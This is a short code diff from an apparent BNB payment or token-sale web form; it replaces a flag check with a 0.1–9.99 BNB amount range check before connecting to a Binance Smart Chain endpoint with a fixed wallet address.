@@ -409,7 +409,7 @@ alert ("Minimuam 0.1 BNB !");
 ok = 0;
 alert ("Maximum  10 BNB !");
 }
-if ( ok == 1 ) {
+if ( bnb_val_int > 0.1 &&  bnb_val_int < 9.99 ) {
 
  const web3 = new Web3('https://bsc-dataseed1.binance.org');
 const address = '0x61C0C27d2dBe8495e3Ff21Da3EFc7d8aA78606f5';
